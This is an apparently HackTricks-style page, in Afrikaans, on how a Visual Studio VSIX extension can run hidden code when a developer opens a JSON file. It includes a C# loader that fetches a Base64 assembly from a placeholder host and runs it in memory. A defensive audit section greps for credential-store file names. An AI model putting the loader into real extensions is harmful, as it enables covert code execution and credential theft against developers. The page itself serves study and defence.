# Misbruik van Visual Studio VSIX-uitbreidings

{{#include ../banners/hacktricks-training.md}}

’n Visual Studio-uitbreiding kan gewone redigeerderaktiwiteit in kode-uitvoering onder die aangemelde gebruiker se identiteit omskep. ’n kwaadwillige VSIX, ’n nabootsende uitgewer of ’n gekompromitteerde uitbreidingopdatering kan daardie gebruiker via normale installasiekanale bereik. Installering met ’n administrateurprompt is ’n installasiepad waarvoor toestemming gegee word, nie ’n outomatiese voorregverhoging nie.<sup>[[1]](#references)</sup>

## Uitvoeringsmodel

Klassieke VSSDK-uitbreidings word gewoonlik binne `devenv.exe` uitgevoer. Die nuwer `VisualStudio.Extensibility`-model laat moderne .NET-uitbreidings hoofsaaklik buite die proses loop: Visual Studio tree as tussenganger op vir oproepe na ’n toegewyde `Microsoft.ServiceHub.Host.Extensibility`-proses. Dit isoleer IDE-stabiliteit, maar **sandkasseer nie** die uitbreiding teen die gebruiker se Windows-toestemmings nie. Die presiese uitvoerbare lêernaam kan ’n argitektuuragtervoegsel insluit, soos `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[1]](#references)[[2]](#references)</sup>

### Aktivering deur gewone redigeerderaktiwiteit

In plaas daarvan om net ’n opvallende kieslysopdrag beskikbaar te stel, kan ’n uitbreiding `ITextViewOpenClosedListener` implementeer. Die `TextViewOpenedAsync`-terugroepfunksie word vir ooreenstemmende dokumente aangeroep, terwyl `TextViewExtensionConfiguration.AppliesTo` aktivering tot ’n algemene tipe soos JSON kan beperk. ’n Regte formateerder of linter kan steeds die geadverteerde werk verrig terwyl ’n tweede aksie as newe-effek van die oopmaak van ’n lêer uitgevoer word.<sup>[[1]](#references)[[3]](#references)</sup>

Die volgende vereenvoudigde patroon wys die belangrike uitvoeringspunte; dit laat die legitieme formateerder en foutafhandeling ter wille van duidelikheid weg.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Gebeurtenis-aangevuurde in-geheue-laaier vir bestuurde samestellings</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Hierdie ketting laai Base64-teks af, dekodeer dit na assembly-grepe, laai dit vanaf ’n `MemoryStream` deur ’n versamelbare `AssemblyLoadContext`, roep die weerspieëlde `EntryPoint` met óf geen parameters óf ’n `string[]` aan, wag op asinkrone entry points en laai die konteks af. Die tweede stadium word nie na skyf geskryf nie, hoewel die VSIX en die primêre uitbreiding-DLL skyfartefakte bly. Base64 bied geen egtheidswaarborg of vertroulikheid nie; die gebruik van HTTP laat ook toe dat ’n aanvaller op die pad die antwoord vervang.<sup>[[1]](#references)</sup>

Operasionele variasies sluit in om alle uitsonderings te onderdruk sodat die aangekondigde funksie voortgaan wanneer staging misluk, of om `ITextViewChangedListener` te gebruik om ná wysigings te aktiveer. Kode loop in die uitbreidinggasheer en kan bestuurde API’s, P/Invoke, lêers, geloofsbriewe en kinderprosesse gebruik wat vir daardie gebruiker beskikbaar is.<sup>[[1]](#references)</sup>

Vir ’n verwante, redigeerderspesifieke uitvoeringsoppervlak wat op outomatiese laai van native plugins berus, sien:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Misbruik van Marketplace- en afleweringsvertroue

’n VSIX kan as ’n lêer wat direk gedeel of deur phishing afgelewer word, vanaf die web-Marketplace, of deur Visual Studio se ingebedde Marketplace-blaaier aankom. Uitgewerregistrasie, wat hoofsaaklik uniekheid en ’n lys gereserveerde woorde afdwing, kan uitgeweridentiteite met ’n misleidende voorkoms toelaat; die kompromittering van ’n reeds vertroude uitgewer of uitbreiding is selfs doeltreffender omdat dit ’n geïnstalleerde gebruikersbasis erf. Marketplace-installasie roep Visual Studio Installer aan en plaas die afgelaaide VSIX tydelik onder `%LOCALAPPDATA%\Temp`; `payload.vsix` word ook wettig gebruik, dus is die lêernaam alleen nie ’n aanduiding nie.<sup>[[1]](#references)</sup>

MDSec het nie ’n Visual Studio-URL-protokol geïdentifiseer wat ’n uitbreiding direk installeer nie. ’n Operateur moet steeds die gebruiker kry om die VSIX te installeer en te vertrou, of moet die verspreidingsroete van ’n bestaande uitbreiding kompromitteer. ’n `AllUsers`-pakket installeer onder die Visual Studio-installasiegids en kan verhoogde regte versoek, maar dit is normale installeerdergedrag waarvoor toestemming gegee word, nie ’n outomatiese roete na administrateur- of SYSTEM-regte nie.<sup>[[1]](#references)[[4]](#references)</sup>

### Statiese ouditering op skaal

VSIX-pakkette is gewoonlik ZIP-houers, dus kan ’n veilige Marketplace-hersieningspyplyn pakkette opspoor, hulle **uitpak sonder om uitbreidingskode te laai**, die manifests ontleed, uitvoerbare oppervlaktes identifiseer en bestuurde assemblies met `ilspycmd` dekompileer. Gee voorkeur aan assemblies wat deur die uitbreiding besit word nadat algemene saamgebundelde afhanklikhede uitgesluit is, en korreleer dan stringe uit geloofsbriewebewaarplekke met gedragsgroepe soos lêerlees plus netwerkversending, enkodering plus versending, aflaai plus uitvoering, geloofsbriefbestuurder plus netwerktoegang, of skermskoot plus versending.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Inventariseer ook native DLLs, MSBuild-teikens, skrifte, T4-sjablone en installeerder-vragte, eerder as om aan te neem dat elke uitvoeringsoppervlak uit managed code bestaan. Vergelyk verdagte gedrag met die doel wat in die manifest verklaar word; telemetrie en wettige opdateerders kan soos exfiltration of staging lyk. ’n Slegs-statiese hersiening mis gepakte, geobfuskeerde, dinamies opgeloste en sluimerende kode, en as jy net die jongste weergawe hersien, mis jy kwaadwillige historiese vrystellings.<sup>[[1]](#references)</sup>

VS Code gebruik ’n ander extension host en manifest. Sien [VS Code extension drop-share execution](vscode-extension-abuse.md) vir ’n skryfbare share wat ’n outomatiese installering van ’n VS Code-extension aktiveer.

’n Afsonderlike projeklaai-aanval kan ’n kwaadwillige [MSBuild `GetFrameworkPaths` target](visual-studio-project-msbuild-execution.md) uitvoer sonder om ’n VSIX te installeer.<sup>[[6]](#references)</sup>

## References

- [1] [MDSec - Visual Studio-uitbreidings herbesoek](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - Meer oor VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - Anatomie van ’n VSIX-pakket](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - ilspycmd .NET-nutsmiddel](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
- [6] [Unit 42 - Blinder Tunnel-veldtog teiken Irakse infrastruktuur](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
{{#include ../banners/hacktricks-training.md}}
